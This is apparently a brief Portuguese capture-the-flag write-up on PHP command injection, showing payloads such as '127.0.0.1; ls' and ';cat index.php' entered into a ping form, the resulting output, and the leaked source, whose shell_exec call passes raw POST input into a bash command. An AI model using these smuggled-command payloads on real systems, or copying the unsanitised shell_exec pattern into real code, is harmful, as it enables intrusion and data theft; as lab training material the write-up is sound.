# PHP - Command injection

É possível embutir um segundo comando com ponto e vírgula (;). Então usamos ls para visualizar o arquivo index.php no diretório, cat para lê-lo e depois visualizar a flag pelo código fonte:

<pre>127.0.0.1; ls
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.050 ms
64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.036 ms
64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.036 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1998ms
rtt min/avg/max/mdev = 0.036/0.040/0.050/0.009 ms
index.php</pre>

<pre>127.0.0.1;cat index.php
< ?php 
$flag = "(flag_here)";
if(isset($_POST["ip"]) && !empty($_POST["ip"])){
        $response = shell_exec("timeout 5 bash -c 'ping -c 3 ".$_POST["ip"]."'");
        echo $response;
}
?></pre>
